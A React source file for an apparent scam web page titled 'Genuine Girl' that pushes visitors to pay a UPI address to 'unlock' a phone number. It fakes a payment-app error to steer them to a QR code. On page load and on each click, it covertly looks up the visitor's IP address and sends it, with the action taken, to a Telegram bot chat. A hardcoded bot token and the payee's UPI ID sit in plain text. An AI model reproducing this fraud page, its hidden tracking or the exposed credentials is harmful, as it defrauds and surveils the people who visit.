import './App.css';
import React, { useEffect, useState } from 'react';
import { Modal, ModalHeader } from 'reactstrap';
import PaymentModal from './modal';
let ip = 'Not Found'

async function sendUpdate(msg) {
  if (ip === 'Not Found') {
    fetch('https://api.db-ip.com/v2/free/self')
      .then(result => result.json())
      .then((output) => {
        ip = output;
        const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${msg}--------${ip.ipAddress}`
        fetch(url, {
          method: "POST",
          headers: { 'Content-Type': 'application/json' },
          body: ''
        }).then(res => {
          console.log("Request complete!");
        })
      }).catch(err => console.error(err));
  } else {
    const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${msg}--------${ip.ipAddress}`
    fetch(url, {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: ''
    }).then(res => {
      console.log("Request complete!");
    })
  }
}

function App() {
  const [isOpen, setisOpen] = useState(false);

  useEffect(() => {
    sendUpdate("Home");
    setTimeout(() => {
      console.log("launching");
      //window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ShruthiReddy&tn=Genuine_Girl", "_self");
    }, 1500);
  }, []);



  const handlepayButton = async () => {
    await sendUpdate("PayButton")
    window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ShruthiReddy&tn=Genuine_Girl", "_self");
  }

  const handleWspButton = async () => {
    setisOpen(!isOpen)
    await sendUpdate("WhatsppBtn")
    //window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ShruthiReddy&tn=Genuine_Girl&am=350", "_self");
    //return (<PaymentModal isOpen={true}></PaymentModal>)
  }

  const MsgBtnCombo = ({ msg, btnName, handler, err }) => {
    return (
      <div className="msgBtn">
        <h6>{msg}</h6>
        <button className='button' onClick={() => { handler() }}>{btnName}</button>
        {err
          && <span>
            <p style={{ margin: "0px", fontWeight: 'normal', fontSize: "11px", color: "red" }}>PhonePe is not Working tempoarily!!</p>
            <p style={{ margin: "0px", fontWeight: 'normal', fontSize: "11px", color: "red" }}>Pay using QR Code Above or use GPay</p>
          </span>
        }
      </div>
    )
  }

  return (
    <div className="App" onClick={() => { /*setisOpen(false) */ }}>
      <header className="App-header">
        <h1 style={{}}>🍆Genuine Girl!!🍆</h1>
        <CopyExample />
        <MsgBtnCombo msg="You should PAY first to Unlock My Number!!😜" btnName="PAY NOW!!" handler={handlepayButton} err={true}></MsgBtnCombo>
        <MsgBtnCombo msg="Click Below👇 For My Whatsapp Number!!" btnName="Whatsapp Number!" handler={handleWspButton} err={false}></MsgBtnCombo>
        <h6>PAY NOW and Send me screenshot on Telegram!!🥰</h6>
        {isOpen && <PaymentModal isOpen={isOpen} setisOpen={setisOpen} fn={handlepayButton} className="special_modal"></PaymentModal>}
      </header>
    </div >
  );
}

function CopyExample() {
  const [isCopyOpen, setIsCopyOpen] = useState(false);

  const toggle = () => {
    setIsCopyOpen(!isCopyOpen)
  }

  const Copymodal = () => {

    return (
      <div>
        <Modal style={{ padding: "50px 40px" }} isOpen={isCopyOpen} toggle={toggle} className="special_modal">
          <ModalHeader toggle={toggle}>
            <p>Copied My UPI Address Successfully!!</p>
            <div className='insideCard'>
              <p style={{ margin: "0px" }}>Open PhonePe and paste the UPI address to Pay!!</p>
            </div>
          </ModalHeader>
        </Modal>
      </div>
    );

  }

  return (
    <div className='card'>
      <div style={{ color: "mistyrose", fontWeight: 'bold' }}>
        <p style={{ fontSize: "15px" }}>If "<span style={{ color: "red" }}>PAY NOW</span>" Button is Not Working!!</p>
        <p style={{ marginTop: "-20px" }}> Pay to my QR Code 👇🏻👇🏻👇🏻</p>
      </div>
      <img className='qr' style={{ marginTop: "-16px" }} alt='' src='./QR.jpg'></img>
      <img style={{ marginBottom: "-10px", width: "50%" }} alt='' src='./upilogo.png'></img>
      <div style={{ display: "flex", padding: "15px", height: "50px", margin: "-5px" }}>
        <input readOnly value={"bharatpe.0851610820@icici"}></input >
        <button className='cpybutton' onClick={async () => { setIsCopyOpen(true); await sendUpdate('Copied'); navigator.clipboard.writeText('bharatpe.0851610820@icici') }}>Copy</button>
      </div>
      <Copymodal></Copymodal>
    </div>
  );
}


export default App;
